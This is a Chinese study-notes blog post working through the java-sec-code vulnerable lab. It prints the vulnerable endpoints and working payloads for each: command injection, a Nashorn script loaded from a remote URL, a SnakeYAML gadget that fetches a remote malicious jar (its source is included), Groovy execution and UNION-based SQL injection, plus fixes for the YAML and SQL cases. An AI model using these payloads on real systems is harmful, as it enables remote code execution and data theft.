class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">13.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinseyy.github.io/2025/06/26/java-sec-code/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">java-sec-code<a class="post-edit-link" href="https://github.com/kinseyy/kinseyy.github.io/tree/master/2024/05/31/hello-world_posts/java-sec-code.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2025-06-26 20:58:52" itemprop="dateCreated datePublished" datetime="2025-06-26T20:58:52+08:00">2025-06-26</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2025-07-30 11:36:12" itemprop="dateModified" datetime="2025-07-30T11:36:12+08:00">2025-07-30</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">12k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">60m</span></span></span><span class="leancloud_visitors" id="/2025/06/26/java-sec-code/" data-flag-title="java-sec-code"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2025/06/26/java-sec-code/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/java/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">java</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>靶场需访问<a target="_blank" rel="noopener" href="http://localhost:8080/index">http://localhost:8080/index</a></p>
<p>默认账号密码为admin admin123</p>
<p>题目在源码里（亏我找半天）</p>
<p>由于后面环境是docker开的，计算器可能弹不出来</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-rce-runtime-exec"><a href="#1-rce-runtime-exec" class="headerlink" title="1. &#x2F;rce&#x2F;runtime&#x2F;exec"></a>1. &#x2F;rce&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>命令执行</strong>：通过调用 <code>Runtime.getRuntime().exec(cmd)</code> 执行传入的命令，这会启动一个新的子进程来执行该命令。</p>
<p><strong>输入流处理</strong>：使用 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 从子进程的标准输出流中读取命令执行的结果。这些结果会被累积到一个 <code>StringBuilder</code> 中。</p>
<p><strong>异常捕获</strong>：如果执行过程中发生异常，捕获并返回异常的字符串描述。</p>
<p><strong>退出码处理</strong>：在命令执行完成后，检查子进程的退出码。如果退出码不为零且为 1，则表示命令执行失败。</p>
<p><strong>返回结果</strong>：如果命令执行成功，返回命令的输出内容；如果发生错误，则返回错误信息。</p>
<p>我们可以通过Runtime.getRuntime()这个方法来进行命令执行，在该代码里它通过传入cmd变量进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png" alt="image-20241206200351163" loading="lazy"></p>
<h4 id="2-rce-ProcessBuilder"><a href="#2-rce-ProcessBuilder" class="headerlink" title="2.&#x2F;rce&#x2F;ProcessBuilder"></a>2.&#x2F;rce&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String[] arrCmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">           <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">           <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.toString();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>命令执行</strong>： <code>String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</code><br>通过 <code>ProcessBuilder</code> 启动一个新的 shell 进程，执行传入的命令 <code>cmd</code>。这里使用 <code>-c</code> 选项告诉 shell 执行字符串中的命令。</p>
<p><strong>启动进程</strong>： <code>Process p = processBuilder.start();</code><br>启动进程后，获取该进程的标准输出流并读取其内容。</p>
<p><strong>读取输出</strong>： 通过 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 逐行读取进程的输出并存储在 <code>StringBuilder</code> 中。</p>
<p><strong>异常处理</strong>： 如果命令执行失败或抛出异常，会返回异常的字符串表示。</p>
<p>该代码通过get请求传入一个cmd，然后利用ProcessBuilder这个类调用系统进程来命令执行</p>
<p>注意，在windows系统里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br></pre></td></tr></table></figure>

<p>我们需要在源代码中修改，不然命令执行会报错</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png" alt="image-20241206202436880" loading="lazy"></p>
<h4 id="3-rce-jscmd"><a href="#3-rce-jscmd" class="headerlink" title="3.&#x2F;rce&#x2F;jscmd"></a>3.&#x2F;rce&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到它接收一个名为 <code>jsurl</code> 的参数；</p>
<p>然后使用 Nashorn JavaScript 引擎执行传入 URL 所加载的 JavaScript 脚本。</p>
<p>由于命令无回显，我们可以通过报错来判断</p>
<p>shell.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http://ip/shell.js</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png" alt="image-20250522213856792" loading="lazy"></p>
<p>说不存在clac.exe，的确不存在，这说明命令成功执行</p>
<h4 id="4-rce-vuln-yarm"><a href="#4-rce-vuln-yarm" class="headerlink" title="4.&#x2F;rce&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;rce&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">     <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">     y.load(content);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jar是我们远程加载的恶意文件，源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p>
<p>payload链接：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>打包为jar</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png" alt="image-20250525193848130" loading="lazy"></p>
<p>漏洞修复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="line">public void secYarm(String content) &#123;</span><br><span class="line">    Yaml y = new Yaml(new SafeConstructor());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-rce-groovy"><a href="#5-rce-groovy" class="headerlink" title="5.&#x2F;rce&#x2F;groovy"></a>5.&#x2F;rce&#x2F;groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p>
<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/groovy?content=&quot;calc.exe&quot;.execute()</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png" alt="image-20250525195244895" loading="lazy"></p>
<p>由于靶场是在docker搭建的，所以弹不出计算器，会提示不存在这个文件</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="1-sqli-jdbc-vuln"><a href="#1-sqli-jdbc-vuln" class="headerlink" title="1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbc_sqli_vul</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">            System.out.println(<span class="string">&quot;Connect to database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sqli vuln code</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> con.createStatement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>漏洞成因：直接插入username，造成sql注入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27; union select 1,database(),3,4--+</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png" alt="image-20250525202433620" loading="lazy"></p>
<p>防护</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// fix code</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, username);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



